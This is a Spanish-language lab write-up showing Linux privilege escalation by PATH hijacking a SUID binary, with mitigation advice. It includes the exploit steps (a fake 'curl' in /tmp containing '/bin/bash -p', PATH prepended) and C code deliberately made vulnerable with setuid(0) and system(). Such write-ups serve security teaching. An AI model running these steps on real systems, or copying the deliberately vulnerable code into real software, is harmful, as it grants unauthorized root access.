# Escalada de privilegios en Linux mediante secuestro de SUID + PATH

**Este laboratorio demuestra cómo un binario SUID mal configurado puede ser explotado para lograr una escalada de privilegios mediante PATH hijacking..**


## 🎯 Objetivo
-   Analizar un binario SUID
-   Identificar el uso de funciones inseguras (`system`)
-   Explotar PATH hijacking
-   Escalar privilegios a root

## 🧱 Entorno de laboratorio
-   Sistema operativo: Kali Linux
-   Usuario sin privilegios: `smbuser`
-   Binario vulnerable: `/opt/statuscheck`
-   Usuario privilegiado: `root`


## 🔭 Análisis del binario
* Se ejecuta el comando para enumerar los archivos que tengan permiso SUID `find / -perm -4000 -ls 2 > /dev/null`
~~~
    ┌──(smbuser㉿kali)-[~]
    └─$ find / -perm -4000 -ls 2> /dev/null
   422344    384 -rwsr-xr-x   1 root     root       391744 abr 12 06:49 /usr/lib/openssh/ssh-keysign
   395416     52 -rwsr-xr--   1 root     messagebus    51272 feb 22 19:32 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1197091     16 -rwsr-sr-x   1 root     root          14672 abr 14 08:59 /usr/lib/xorg/Xorg.wrap
  2098149     16 -rwsr-xr-x   1 root     root          15232 may 26 15:39 /opt/google/chrome/chrome-sandbox
  7471275     16 -rwsr-xr-x   1 root     root          16064 may 31 00:31 /opt/statuscheck
~~~

	Salida:  Archivo con permiso SUID: `-rwsr-xr-x   1 root     root          16064 may 31 00:31 /opt/statuscheck`
✔ El binario tiene el bit SUID activo (4755)  
✔ Se ejecuta con privilegios de root
* Inspección con strings: `strings /opt/statuscheck`
	Salida relevante: 
~~~
┌──(smbuser㉿kali)-[~]
└─$ strings /opt/statuscheck 
/lib64/ld-linux-x86-64.so.2
setgid
setuid
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start
_ITM_registerTMCloneTable
PTE1
u+UH
curl -I 192.168.1.18
~~~
✔ El binario utiliza `system()`  
✔ Llama a `curl` sin una ruta absoluta
👉 Esto sugiere una posible vulnerabilidad de PATH hijacking
⚠️ Intento inicial (exploit fallido)
Código vulnerable inicial:

```
#include <stdlib.h>

int main() {
    system("curl -I 192.168.1.18");
    return 0;
}
```

Intento de explotación:

```
export PATH=/tmp:$PATH

echo '/bin/bash -p' > /tmp/curl
chmod +x /tmp/curl

/opt/statuscheck
```

Resultado:

 No se logró escalada de privilegios

¿Por qué falló?

Aunque el binario es SUID, el exploit falla debido a cómo funciona internamente `system()`:

```
system() → /bin/sh -c "command"
```

En sistemas Linux modernos:

-   `/bin/sh` (generalmente `dash`) puede descartar privilegios
-   El comando se ejecuta como el usuario actual, no como root

Por lo tanto:

-   Se produce el PATH hijacking
-   PERO el payload se ejecuta sin privilegios elevados

**Técnica de explotación: PATH Hijacking**

El PATH hijacking funciona mediante:

-   Colocar un binario/script malicioso en un directorio con permisos de escritura
-   Modificar `$PATH` para que ese directorio sea buscado primero
-   Forzar al programa a ejecutar el binario controlado por el atacante

🔧 Corrección del binario (haciéndolo explotable)

Código vulnerable actualizado:

```
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("curl -I 192.168.1.12");
    return 0;
}
```

¿Por qué funciona?

-   `setuid(0)` asegura que el proceso se ejecute como root
-   Evita la pérdida de privilegios durante la ejecución
-   El `curl` malicioso ahora se ejecuta con privilegios elevados

**Pasos de explotación**

1.  Modificar PATH

```
export PATH=/tmp:$PATH
```

2.  Crear payload malicioso

```
echo '/bin/bash -p' > /tmp/curl
chmod +x /tmp/curl
```

3.  Ejecutar el binario vulnerable

```
/opt/statuscheck
```

**Prueba de explotación**

```
id
```

Salida:

```
uid=0(root) gid=0(root)
```

**Escalada de privilegios exitosa**

## 🛡️Mitigación

Para prevenir esta vulnerabilidad:

✔ Usar rutas absolutas

```
execl("/usr/bin/curl", "curl", "-I", "192.168.1.12", NULL);
```

✔ Evitar `system()`

-   Utilizar `execve`, `execl` u otras alternativas más seguras
-   Evitar la interpretación por shell

✔ Evitar binarios SUID innecesarios

-   Usar SUID solo cuando sea absolutamente necesario
-   Aplicar el principio de mínimo privilegio

**Conceptos clave aprendidos**

-   Binarios SUID
-   PATH hijacking
-   Diferencia entre `system()` y `exec*`
-   Comportamiento de `/bin/sh` en contextos SUID
-   Mecanismos de reducción de privilegios en Linux

**Conclusión**

Este laboratorio demuestra que:

-   No todos los binarios SUID son trivialmente explotables
-   Comprender cómo funcionan internamente funciones como `system()` es fundamental
-   Pequeños cambios en la implementación pueden convertir un escenario no explotable en una vulnerabilidad crítica

👨‍💻 Autor

GitHub: (OmoraV-H)